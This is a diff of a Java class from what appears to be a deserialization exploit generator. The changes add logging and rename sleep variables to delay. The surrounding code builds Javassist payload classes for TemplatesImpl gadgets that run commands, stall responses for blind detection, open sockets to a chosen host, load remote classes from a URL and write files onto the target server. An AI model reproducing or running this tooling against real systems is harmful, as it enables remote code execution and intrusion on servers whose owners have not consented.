@@ -33,8 +33,8 @@ public class TemplatesImpl {
     @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
     public Object runtime(SinksHelper sinksHelper) throws Exception {
         String className = "RuntimeD";
-
         String command = sinksHelper.getCommand();
+        Printer.greenInfo("command: " + command);
 
         ClassPool pool = ClassPool.getDefault();
 
@@ -66,16 +66,17 @@ public class TemplatesImpl {
     public Object delay(SinksHelper sinksHelper) throws Exception {
         String className = "DelayD";
 
-        Long sleepTime = sinksHelper.getSleepTime();
-        String sleep = sinksHelper.getSleep();
+        Long delayTime = sinksHelper.getDelayTime();
+        String delay = sinksHelper.getDelay();
+        Printer.greenInfo(String.format("System will delay response for %s seconds", delayTime));
 
         String code;
         ClassPool pool = ClassPool.getDefault();
-        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
-            sleepTime *= 1000L;
-            code = "java.lang.Thread.sleep((long)" + sleepTime + ");";
+        if (delay != null && delay.equalsIgnoreCase("timeunit")) {
+            delayTime *= 1000L;
+            code = "java.lang.Thread.sleep((long)" + delayTime + ");";
         } else {
-            code = "java.util.concurrent.TimeUnit.SECONDS.sleep((long)" + sleepTime + ");";
+            code = "java.util.concurrent.TimeUnit.SECONDS.sleep((long)" + delayTime + ");";
         }
         CtClass ctClass = pool.makeClass(className);
         CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
@@ -101,6 +102,7 @@ public class TemplatesImpl {
         String className = "SocketD";
 
         String thost = sinksHelper.getHost();
+        Printer.greenInfo("System will initiate a socket request to " + thost);
 
         String[] hostSplit = thost.split("[:]");
         String host = hostSplit[0];
@@ -134,12 +136,15 @@ public class TemplatesImpl {
         String url = sinksHelper.getUrl();
         String remoteClassName = sinksHelper.getRemoteClassName();
         Object constructor = sinksHelper.getConstructor();
+        Printer.greenInfo("Remote url: " + url);
+        Printer.greenInfo("Remote class name: " + remoteClassName);
 
 
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = null;
 
         if (constructor != null) {
+            Printer.greenInfo("Remote class constructor param: " + constructor);
             // 转为 Integer
             try {
                 constructor = Integer.parseInt(constructor.toString());
@@ -189,10 +194,12 @@ public class TemplatesImpl {
         String serverFilePath = sinksHelper.getServerFilePath();
         String localFilePath = sinksHelper.getLocalFilePath();
         String fileContent = sinksHelper.getFileContent();
+        Printer.greenInfo("Server file path: " + serverFilePath);
 
         byte[] contentBytes = new byte[]{};
 
         if (localFilePath != null) {
+            Printer.greenInfo("Local file path: " + localFilePath);
             try {
                 FileInputStream fileInputStream = new FileInputStream(localFilePath);
                 contentBytes = new byte[fileInputStream.available()];
@@ -202,11 +209,11 @@ public class TemplatesImpl {
                 Printer.error("File read error");
             }
         } else if (fileContent != null) {
+            Printer.greenInfo("File content: " + fileContent);
             contentBytes = fileContent.getBytes();
         }
 
         String b64 = CryptoProcessor.base64encoder(contentBytes);
-
 
         ClassPool pool = ClassPool.getDefault();
 
